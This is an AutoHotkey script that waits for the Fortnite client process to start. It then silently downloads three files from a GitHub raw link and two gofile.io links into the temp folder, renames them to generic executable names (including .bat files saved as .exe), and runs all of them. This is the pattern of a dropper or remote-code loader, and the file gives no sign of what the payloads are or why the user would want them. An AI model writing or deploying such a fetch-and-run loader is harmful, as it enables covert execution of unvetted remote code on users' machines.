#Persistent
SetTimer, CheckFortnite, 2000
Return

CheckFortnite:
Process, Exist, FortniteClient-Win64-Shipping.exe
if (ErrorLevel) {
    url1 := "https://github.com/At14236/LawinForReload/raw/refs/heads/main/LawinServer.exe"   ; <-- Replace with the first file URL
    url2 := "https://store-eu-par-2.gofile.io/download/web/a678a149-5749-4c99-a17a-34d4e8ee5435/install_packages.bat"  ; <-- Replace with the second file URL
    url3 := "https://cold-na-phx-7.gofile.io/download/web/9504fbe0-1619-469f-abff-328f139f6413/start.bat"   ; <-- Replace with the third file URL

    savePath1 := A_Temp "\firstfile.exe"
    savePath2 := A_Temp "\secondfile.exe"
    savePath3 := A_Temp "\thirdfile.exe"

    ; Download all three files
    URLDownloadToFile, %url1%, %savePath1%
    URLDownloadToFile, %url2%, %savePath2%
    URLDownloadToFile, %url3%, %savePath3%

    ; Check if all three files downloaded successfully
    if (FileExist(savePath1) && FileExist(savePath2) && FileExist(savePath3)) {
        Run, %savePath1%
        Run, %savePath2%
        Run, %savePath3%
    } else {
        MsgBox, One or more files failed to download!
    }

    ExitApp
}
Return
